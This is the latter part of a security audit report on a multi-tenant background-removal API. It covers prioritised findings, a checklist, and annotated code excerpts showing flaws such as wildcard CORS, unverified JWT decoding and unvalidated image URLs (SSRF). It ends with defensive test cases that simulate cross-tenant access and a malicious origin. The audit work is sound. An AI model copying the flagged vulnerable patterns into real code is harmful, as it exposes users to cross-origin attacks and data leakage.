| 4 | **No rate limiting enforcement in Lambda** | HIGH | Rate limiter defined but not enforced - allows resource exhaustion | Add rate limit middleware to all handler entry points | P1 | 6h |
| 5 | **Audience (aud) claim not validated** | HIGH | JWT tokens from other services/apps may be accepted | Add audience validation to `jwtVerify` options | P1 | 1h |
| 6 | **No CSRF protection for state-changing operations** | HIGH | Wildcard CORS enables CSRF attacks on POST/DELETE endpoints | Implement CSRF token validation or SameSite cookies | P1 | 4h |
| 7 | **No token revocation mechanism** | MEDIUM | Compromised tokens valid until expiration (1 hour exposure) | Implement revocation list in DynamoDB/Redis | P2 | 6h |
| 8 | **productName may contain PII** | MEDIUM | User-identifying information stored in job metadata | Sanitize productName; store hash/UUID reference only | P2 | 2h |
| 9 | **Missing audit logging for sensitive operations** | LOW | Difficult to investigate security incidents or policy violations | Log all DELETE, admin operations to CloudWatch/S3 | P3 | 4h |
| 10 | **No user account status validation** | LOW | Suspended/disabled Cognito users can still authenticate | Query Cognito user status or add custom claim | P3 | 3h |

**Priority Levels:**
- **P0:** Critical - Immediate action required (within 24h)
- **P1:** High - Address in current sprint (within 1 week)
- **P2:** Medium - Address in next sprint (within 2 weeks)
- **P3:** Low - Backlog item (within 30 days)

**Estimated Total Remediation Effort:** 34 hours (4.25 developer days)

---

## 9. Security Checklist

### Authentication & Authorization
- [✅] JWT signature validation using JWKS
- [✅] Token expiration enforced (exp claim + 5min clock skew)
- [✅] Issuer validation (iss claim must be Cognito)
- [❌] **Audience validation (aud claim) - MISSING**
- [✅] Tenant consistency validation (header vs JWT claim)
- [❌] **Resource ownership checks on write operations - MISSING**
- [⚠️] Role-based authorization (RBAC) partially implemented
- [❌] **Token revocation mechanism for compromised tokens - MISSING**

### Tenant Isolation
- [✅] Tenant ID embedded in DynamoDB partition key
- [✅] All queries scoped to authenticated tenant (from JWT, not header)
- [✅] No shared resources across tenants
- [❌] **Cross-tenant access test coverage - MISSING**

### Data Protection
- [⚠️] Sensitive data encrypted at rest (DynamoDB default, S3 not verified)
- [✅] HTTPS enforced for all API endpoints (API Gateway default)
- [⚠️] Pre-signed URLs have expiration limits (not verified in code)
- [❌] **PII stored in job metadata (productName) - RISK**
- [✅] Credentials excluded from logs
- [❌] **Admin API keys in environment variables - CRITICAL RISK**

### Input Validation
- [✅] Request body schema validation (Zod schemas)
- [⚠️] File type validation for image uploads (not visible in audit scope)
- [⚠️] File size limits enforced (not visible in audit scope)
- [⚠️] S3 URL validation (not visible in audit scope)
- [✅] SQL/NoSQL injection prevention (DynamoDB parameterized queries assumed)
- [✅] jobId format validation (UUID v4, timing-safe comparison)

### Error Handling
- [✅] Stack traces excluded from production responses
- [✅] Generic error messages for external clients
- [✅] Detailed errors logged internally with context
- [✅] No database error details exposed

### Network Security
- [❌] **CORS configured with wildcard origin (`*`) in OPTIONS handler - CRITICAL**
- [❌] **Wildcard CORS allows ANY origin - CRITICAL**
- [N/A] localhost in production CORS (not applicable - wildcard allows all)
- [❌] **CSRF protection for state-changing operations - MISSING**

### Monitoring & Logging
- [✅] Authentication failures logged (console.error in validateAuthToken)
- [⚠️] Authorization failures logged but without sufficient context
- [❌] **Sensitive operations NOT audited (DELETE, admin actions) - MISSING**
- [⚠️] CloudWatch alarms for security events (cache failures only)
- [⚠️] Log retention configured (not verified in audit scope)

### Infrastructure
- [⚠️] IAM roles follow principle of least privilege (detailed review needed)
- [⚠️] DynamoDB tables have point-in-time recovery enabled (not visible in serverless.yml)
- [⚠️] S3 buckets have versioning enabled (not visible in serverless.yml)
- [❌] **Secrets stored in environment variables (ADMIN_API_KEYS) - CRITICAL**
- [✅] No hardcoded credentials in code (except ADMIN_API_KEYS in env)

### Dependencies
- [⚠️] npm audit status (not run during audit)
- [⚠️] Dependencies regularly updated (not verified)
- [⚠️] Dependency license compliance verified (not verified)
- [⚠️] No deprecated packages in use (not verified)

---

## 10. Code Review Examples with Security Annotations

### Example 1: Job Creation Handler (Frontend API Route)

**FILE:** `/services/carousel-frontend/app/api/bg-remover/process/route.ts`

```typescript
export async function POST(request: NextRequest) {
  const startTime = Date.now();
  const jobId = randomUUID(); // ✅ SECURE: Cryptographically secure UUID v4
  let creditTransactionId: string | undefined;
  let creditsDebited = false;

  try {
    // SECURITY: Step 1 - Resolve tenant from request
    const stage = process.env.STAGE || 'dev';
    const tenant = await resolveTenantFromRequest(request, stage);
    // ⚠️ VALIDATE: Ensure tenant from request matches JWT claim

    // SECURITY: Step 2 - Parse and validate request body
    const body = await request.json();
    const validatedRequest = ProcessRequestSchema.parse(body); // ✅ Zod validation

    const { imageUrl, productId, userId: bodyUserId, skipCreditValidation } = validatedRequest;

    // SECURITY: Step 3 - Extract user ID for credit billing
    const userId = extractUserId(request, bodyUserId);
    const bypassCredits = shouldBypassCreditValidation(request, skipCreditValidation);

    // ❌ VULNERABILITY: extractUserId allows unauthenticated extraction from JWT
    // Lines 78-105: Decodes JWT without verification
    // Should rely on authenticateRequest middleware instead

    // SECURITY: Step 4 - Credit validation (lines 193-241)
    if (!bypassCredits) {
      if (!userId) {
        return NextResponse.json(
          { error: 'User identification required for credit billing' },
          { status: 401 }
        );
      }

      // ✅ GOOD: Validate credits BEFORE processing
      const creditResult = await validateAndDebitCredits(tenant, userId, 1, jobId, productId);

      if (!creditResult.success) {
        return NextResponse.json(
          { error: creditResult.error || 'Insufficient credits' },
          { status: creditResult.httpStatus || 402 }
        );
      }

      creditsDebited = true;
      creditTransactionId = creditResult.transactionId;
    }

    // SECURITY: Step 5 - Process image (lines 247-279)
    // ⚠️ MISSING: Validate imageUrl is from allowed domain/bucket
    // ❌ VULNERABILITY: User could provide arbitrary S3 URL (potential SSRF)

    // SECURITY: Step 6 - Emit EventBridge event (lines 299-323)
    const eventBridge = new EventBridgeClient({ region: 'eu-west-1' });
    const eventDetail = {
      file_hash: jobId,
      original_filename: imageUrl ? imageUrl.split('/').pop() || 'input.png' : 'input.png',
      tenant_id: tenant,
      // ⚠️ MISSING: userId not included (no ownership tracking)
    };
    await eventBridge.send(new PutEventsCommand({ Entries: [{
      Source: 'carousel.bg-remover',
      DetailType: 'CarouselImageProcessed',
      Detail: JSON.stringify(eventDetail)
    }] }));

    return NextResponse.json({
      success: true,
      jobId,
      outputUrl,
      creditsUsed,
      creditsRemaining,
      transactionId: creditTransactionId,
    });

  } catch (error) {
    // SECURITY: Error handling (lines 339-392)

    // ✅ GOOD: Attempt refund on failure (lines 351-379)
    if (creditsDebited && creditTransactionId) {
      const userId = extractUserId(request, undefined);
      const tenant = request.headers.get('x-tenant-id') || 'carousel-labs';

      if (userId) {
        try {
          const refundResult = await refundCredits(tenant, userId, 1, jobId, creditTransactionId);
          // ✅ GOOD: Log refund status
        } catch (refundError) {
          console.error('Exception during credit refund', { jobId, error: refundError });
        }
      }
    }

    // ✅ GOOD: Sanitize error messages (lines 382-392)
    return NextResponse.json(
      createProcessResult(false, undefined, undefined, errorMessage, processingTimeMs),
      { status: 500 }
    );
  }
}

// ❌ CRITICAL VULNERABILITY: Wildcard CORS in OPTIONS handler (lines 397-406)
export async function OPTIONS(): Promise<NextResponse> {
  return new NextResponse(null, {
    status: 200,
    headers: {
      'Access-Control-Allow-Origin': '*',  // ❌ ALLOWS ANY ORIGIN
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Tenant-Id',
    },
  });
}

// SECURITY SUMMARY:
// ✅ Input validation with Zod schemas
// ✅ Credit validation before processing
// ✅ Credit refund on failure
// ✅ Sanitized error messages
// ❌ CRITICAL: Wildcard CORS in OPTIONS handler
// ❌ CRITICAL: Hardcoded admin API keys in env (lines 28-30)
// ❌ extractUserId decodes JWT without verification
// ❌ No imageUrl domain validation (SSRF risk)
// ❌ No userId in EventBridge event (no ownership tracking)
```

### Example 2: Admin API Key Validation

**FILE:** `/services/bg-remover/app/api/process/route.ts`

```typescript
// ❌ CRITICAL VULNERABILITY: Hardcoded admin keys in environment
const ADMIN_API_KEYS = (process.env.ADMIN_API_KEYS || '').split(',').filter(Boolean);

// ✅ GOOD: Timing-safe comparison (lines 35-55)
function timingSafeCompare(a: string, b: string): boolean {
  if (typeof a !== 'string' || typeof b !== 'string') {
    return false;
  }

  const aBuffer = Buffer.from(a, 'utf8');
  const bBuffer = Buffer.from(b, 'utf8');

  // ✅ GOOD: Pad to same length to prevent length-based timing attack
  if (aBuffer.length !== bBuffer.length) {
    const maxLen = Math.max(aBuffer.length, bBuffer.length);
    const paddedA = Buffer.alloc(maxLen, 0);
    const paddedB = Buffer.alloc(maxLen, 0);
    aBuffer.copy(paddedA);
    bBuffer.copy(paddedB);
    timingSafeEqual(paddedA, paddedB); // Run comparison even on length mismatch
    return false;
  }

  return timingSafeEqual(aBuffer, bBuffer); // ✅ Constant-time comparison
}

// ✅ GOOD: Constant-time validation against all keys (lines 60-71)
function isValidAdminApiKey(apiKey: string): boolean {
  let isValid = false;
  for (const adminKey of ADMIN_API_KEYS) {
    if (timingSafeCompare(apiKey, adminKey)) {
      isValid = true;
      // ✅ GOOD: Continue loop to maintain constant time
    }
  }
  return isValid;
}

// SECURITY SUMMARY:
// ✅ Timing-safe comparison prevents timing attacks
// ✅ Length normalization prevents length-based timing leaks
// ✅ Constant-time loop prevents early-exit timing leaks
// ❌ CRITICAL: Admin keys stored in environment variables
// ❌ Keys exposed via CloudWatch logs, AWS Console, CloudFormation
// ❌ No key rotation mechanism

// RECOMMENDED: Use SSM SecureString
async function loadAdminApiKeys(): Promise<string[]> {
  const ssm = new SSMClient({ region: 'eu-west-1' });
  const result = await ssm.send(new GetParameterCommand({
    Name: `/tf/${stage}/${tenant}/services/bg-remover/admin-api-keys`,
    WithDecryption: true, // SecureString auto-decryption
  }));

  return (result.Parameter?.Value || '').split(',').filter(Boolean);
}
```

### Example 3: Proxy Route with Rate Limiting

**FILE:** `/services/carousel-frontend/app/api/bg-remover/process/route.ts`

```typescript
// REVIEWED CODE: Rate limiter definition (lines 44-49)
const processRateLimiter = rateLimit({
  windowMs: 60 * 1000,  // 1 minute window
  max: 30,              // 30 requests per minute
  keyPrefix: 'bg-remover:process:',
});

export async function POST(request: NextRequest) {
  try {
    // SECURITY: Step 1 - Authenticate (lines 74-82)
    const { user, error } = await authenticateRequest(request);
    if (error) return error;

    if (!user) {
      return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
    }

    // SECURITY: Step 2 - Permission check (lines 101-110)
    if (!hasPermission(user.role, 'products', 'update')) {
      return NextResponse.json(
        { error: 'Insufficient permissions', traceId: context.traceId },
        { status: 403 }
      );
    } // ✅ RBAC enforced

    // SECURITY: Step 3 - Rate limiting (lines 113-131)
    const rateLimitResult = await processRateLimiter.check(user.id);
    if (!rateLimitResult.success) {
      return NextResponse.json(
        { error: 'Too many requests', retryAfter: Math.ceil(rateLimitResult.retryAfterMs / 1000) },
        {
          status: 429,
          headers: {
            'Retry-After': String(Math.ceil(rateLimitResult.retryAfterMs / 1000)),
            'X-RateLimit-Limit': String(rateLimitResult.limit),
            'X-RateLimit-Remaining': '0',
          },
        }
      );
    } // ✅ Rate limiting enforced

    // SECURITY: Step 4 - Proxy to Lambda (lines 146-162)
    const response = await fetchWithTimeout(`${bgRemoverApiUrl}/bg-remover/process`, {
      method: 'POST',
      headers: injectTraceId(
        {
          'Content-Type': contentType,
          // ✅ Forward auth token
          ...(request.headers.get('authorization') && {
            'Authorization': request.headers.get('authorization')!,
          }),
          'X-User-Id': user.id,     // ✅ Add user context
          'X-Tenant-Id': user.tenantId || '',  // ✅ Add tenant context
        },
        context.traceId
      ),
      body: await request.arrayBuffer(),
    }); // ✅ Authentication, RBAC, rate limiting enforced

    // SECURITY: Step 5 - Return response (lines 197-207)
    return NextResponse.json(data, {
      status: response.status,
      headers: {
        'Cache-Control': 'no-store, no-cache, must-revalidate, private, max-age=0',
        'Pragma': 'no-cache',
        'Expires': '0',
        'X-Content-Type-Options': 'nosniff', // ✅ Security header
        'x-trace-id': context.traceId,
      },
    }); // ✅ No caching, security headers

  } catch (error) {
    // SECURITY: Error handling (lines 208-249)
    if (error instanceof Error && error.name === 'AbortError') {
      return NextResponse.json(
        { error: 'Request timeout', message: 'Request timed out after 30 seconds' },
        { status: 504 }
      );
    }

    return NextResponse.json(
      {
        error: 'Failed to process image',
        message: process.env.NODE_ENV === 'production'
          ? 'Image processing failed'  // ✅ Generic in prod
          : (error instanceof Error ? error.message : 'Unknown error'), // ⚠️ Detailed in dev
      },
      { status: 500 }
    );
  }
}

// SECURITY SUMMARY:
// ✅ Authentication enforced via middleware
// ✅ RBAC permission checks
// ✅ Rate limiting per user
// ✅ Tenant context forwarded to backend
// ✅ Timeout protection (30s)
// ✅ Security headers (X-Content-Type-Options, Cache-Control)
// ⚠️ Error messages leak details in dev (acceptable)
```

---

## Appendix A: OWASP Top 10 Mapping

| OWASP Category | Relevant Findings | Risk Level |
|----------------|-------------------|------------|
| A01:2021 - Broken Access Control | Missing resource ownership checks (jobs accessible within tenant) | CRITICAL |
| A02:2021 - Cryptographic Failures | Admin API keys in environment variables (exposed via logs/console) | CRITICAL |
| A03:2021 - Injection | No SSRF validation on imageUrl parameter | HIGH |
| A04:2021 - Insecure Design | No token revocation mechanism, stateless JWT only | MEDIUM |
| A05:2021 - Security Misconfiguration | Wildcard CORS (`*`) in OPTIONS handler | CRITICAL |
| A06:2021 - Vulnerable Components | Dependencies not audited during review | UNKNOWN |
| A07:2021 - Auth Failures | Audience (aud) claim not validated in JWT | HIGH |
| A08:2021 - Data Integrity Failures | PII in productName, no input sanitization | MEDIUM |
| A09:2021 - Logging Failures | No audit logs for DELETE operations, admin actions | LOW |
| A10:2021 - SSRF | imageUrl parameter not validated (arbitrary S3 URLs) | HIGH |

---

## Appendix B: Testing Recommendations

### Security Test Cases

```typescript
// Test 1: Cross-tenant job access prevention
describe('Tenant Isolation', () => {
  it('should reject cross-tenant job access via header manipulation', async () => {
    const tenantAToken = generateJWT({ tenant: 'carousel-labs', sub: 'user-a' });
    const tenantBJobId = 'job-in-tenant-b';

    const response = await request(app)
      .get(`/api/bg-remover/process?jobId=${tenantBJobId}`)
      .set('Authorization', `Bearer ${tenantAToken}`)
      .set('x-tenant-id', 'competitor-corp'); // Attempt header override

    expect(response.status).toBe(403);
    expect(response.body.error).toContain('Tenant mismatch');
  });
});

// Test 2: JWT expiration enforcement
describe('Authentication', () => {
  it('should reject expired tokens', async () => {
    const expiredToken = generateJWT({
      tenant: 'carousel-labs',
      sub: 'user-1',
      exp: Math.floor(Date.now() / 1000) - 3600 // Expired 1 hour ago
    });

    const response = await request(app)
      .post('/api/bg-remover/process')
      .set('Authorization', `Bearer ${expiredToken}`)
      .send({ imageUrl: 'https://example.com/image.png' });

    expect(response.status).toBe(401);
    expect(response.body.error).toContain('expired');
  });
});

// Test 3: Resource ownership on job access
describe('Authorization', () => {
  it('should prevent non-owners from accessing jobs (within same tenant)', async () => {
    const user1Token = generateJWT({ tenant: 'carousel-labs', sub: 'user-1' });
    const user2Token = generateJWT({ tenant: 'carousel-labs', sub: 'user-2' });

    // Create job as user-1
    const createResponse = await request(app)
      .post('/api/bg-remover/process')
      .set('Authorization', `Bearer ${user1Token}`)
      .send({ imageUrl: 'https://example.com/image.png' });

    const { jobId } = createResponse.body;

    // Attempt to access as user-2 (same tenant)
    const accessResponse = await request(app)
      .get(`/api/bg-remover/process?jobId=${jobId}`)
      .set('Authorization', `Bearer ${user2Token}`);

    // ❌ CURRENT: Returns 200 (vulnerability)
    // ✅ EXPECTED: Returns 404 (not 403 to prevent enumeration)
    expect(accessResponse.status).toBe(404);
  });
});

// Test 4: CORS wildcard vulnerability
describe('CORS Security', () => {
  it('should reject requests from non-whitelisted origins', async () => {
    const maliciousOrigin = 'https://attacker.com';

    const response = await request(app)
      .options('/api/bg-remover/process')
      .set('Origin', maliciousOrigin);

    // ❌ CURRENT: Returns Access-Control-Allow-Origin: *
    // ✅ EXPECTED: Origin not in allowed list
    expect(response.headers['access-control-allow-origin']).not.toBe('*');
    expect(response.headers['access-control-allow-origin']).not.toBe(maliciousOrigin);
  });
});

// Test 5: Rate limiting enforcement
describe('Rate Limiting', () => {
  it('should enforce rate limits (30 req/min)', async () => {
    const token = generateJWT({ tenant: 'carousel-labs', sub: 'user-1' });

    // Send 31 requests rapidly
    const requests = Array(31).fill(null).map(() =>
      request(app)
        .post('/api/bg-remover/process')
        .set('Authorization', `Bearer ${token}`)
        .send({ imageUrl: 'https://example.com/image.png' })
    );

    const responses = await Promise.all(requests);
    const rateLimited = responses.filter(r => r.status === 429);

    expect(rateLimited.length).toBeGreaterThan(0);
    expect(rateLimited[0].headers['retry-after']).toBeDefined();
  });
});

// Test 6: Admin API key timing attack resistance
describe('API Key Validation', () => {
  it('should use constant-time comparison for admin keys', async () => {
    const validKey = 'admin-key-12345';
    const invalidKeys = [
      'admin-key-12346', // Off by one char
      'admin-key-1234',  // One char shorter
      'wrong-key',       // Completely different
    ];

    // Measure timing for each comparison
    const timings = [];

    for (const key of [validKey, ...invalidKeys]) {
      const start = process.hrtime.bigint();

      await request(app)
        .post('/api/bg-remover/process')
        .set('x-api-key', key)
        .send({ imageUrl: 'https://example.com/image.png' });

      const end = process.hrtime.bigint();
      timings.push(Number(end - start) / 1e6); // Convert to ms
    }

    // Timing variance should be minimal (< 10% difference)
    const avgTiming = timings.reduce((a, b) => a + b) / timings.length;
    const maxVariance = Math.max(...timings.map(t => Math.abs(t - avgTiming)));

    expect(maxVariance / avgTiming).toBeLessThan(0.1); // < 10% variance
  });
});
```

---

**End of Security Audit Report**

---

## Sign-Off

**Audited by:** Security Specter
**Date:** 2026-01-02
**Next Review:** 2026-04-02 (90 days)

**Approvals:**
- [ ] Engineering Lead
- [ ] Security Team
- [ ] Product Owner

**Distribution:**
- Engineering team (redacted version - exclude SSM/secrets details)
- Security team (full version)
- Management (executive summary only)

---

## Remediation Tracking

**P0 Items (24h deadline):**
- [ ] Fix wildcard CORS in OPTIONS handler (1h) - Assigned: _____ - Due: 2026-01-03
- [ ] Add resource ownership validation (4h) - Assigned: _____ - Due: 2026-01-03
- [ ] Move admin keys to SSM SecureString (3h) - Assigned: _____ - Due: 2026-01-03

**P1 Items (1 week deadline):**
- [ ] Enforce rate limiting in Lambda handlers (6h) - Assigned: _____ - Due: 2026-01-09
- [ ] Add audience validation to JWT (1h) - Assigned: _____ - Due: 2026-01-09
- [ ] Implement CSRF token validation (4h) - Assigned: _____ - Due: 2026-01-09

**P2 Items (2 week deadline):**
- [ ] Implement token revocation list (6h) - Assigned: _____ - Due: 2026-01-16
- [ ] Sanitize productName for PII (2h) - Assigned: _____ - Due: 2026-01-16

**P3 Items (30 day deadline):**
- [ ] Add audit logging (4h) - Assigned: _____ - Due: 2026-02-01
- [ ] Validate user account status (3h) - Assigned: _____ - Due: 2026-02-01
